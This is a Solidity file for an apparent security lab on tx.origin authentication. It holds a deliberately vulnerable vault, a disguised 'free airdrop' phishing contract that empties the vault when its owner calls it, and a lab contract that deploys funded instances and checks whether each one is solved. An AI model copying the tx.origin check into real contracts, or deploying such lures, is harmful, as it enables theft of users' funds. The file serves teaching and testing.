// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {SolvableBase} from "@common/SolvableBase.sol";

/// @notice Personal vault whose `transferTo` checks `tx.origin == owner`
///         instead of `msg.sender == owner`.
contract Q12TxOriginVault {
    address public immutable owner;

    constructor(address o) payable {
        owner = o;
    }

    function transferTo(address payable to, uint256 amount) external {
        // BUG: tx.origin authentication. Trusts the originating EOA
        //      regardless of which contract is actually calling.
        require(tx.origin == owner, "not owner");
        (bool ok,) = to.call{value: amount}("");
        require(ok, "send failed");
    }

    receive() external payable {}
}

/// @notice A "free airdrop" lure. Calling its only function looks
///         harmless, but internally interacts with the target vault using
///         the caller's tx.origin as authorization.
contract Q12Phisher {
    Q12TxOriginVault public immutable vault;
    address payable public immutable beneficiary;
    bool public airdropClaimed;

    /// @param v Target vault.
    /// @param b Beneficiary used by the lab scenario.
    constructor(Q12TxOriginVault v, address payable b) {
        vault = v;
        beneficiary = b;
    }

    /// @notice The lure. Looks like a freebie; under the hood it calls into
    ///         the vault's tx.origin-gated path.
    function claimFreeAirdrop() external {
        airdropClaimed = true;
        vault.transferTo(beneficiary, address(vault).balance);
    }
}

/// @notice Multi-tenant tx.origin lab. Each user calls `createInstance()`
///         once; the lab deploys a fresh (vault, phisher) pair owned by
///         them and seeds the vault with `SEED` ETH.
contract Q12TxOriginLab is SolvableBase {
    uint256 public constant SEED = 5 ether;

    struct Instance {
        Q12TxOriginVault vault;
        Q12Phisher phisher;
    }

    mapping(address => Instance) private _instances;

    event InstanceCreated(address indexed user, address vault, address phisher);

    receive() external payable {}

    function createInstance() external returns (address vault, address phisher) {
        require(address(_instances[msg.sender].vault) == address(0), "already created");
        require(address(this).balance >= SEED, "lab underfunded");

        Q12TxOriginVault v = new Q12TxOriginVault{value: SEED}(msg.sender);
        Q12Phisher p = new Q12Phisher(v, payable(msg.sender));

        _instances[msg.sender] = Instance(v, p);
        emit InstanceCreated(msg.sender, address(v), address(p));
        return (address(v), address(p));
    }

    function vaultOf(address user) external view returns (Q12TxOriginVault) {
        return _instances[user].vault;
    }

    function phisherOf(address user) external view returns (Q12Phisher) {
        return _instances[user].phisher;
    }

    function isSolved(address user) public view override returns (bool) {
        Instance memory inst = _instances[user];
        if (address(inst.vault) == address(0)) return false;
        return address(inst.vault).balance == 0 && inst.phisher.airdropClaimed();
    }
}
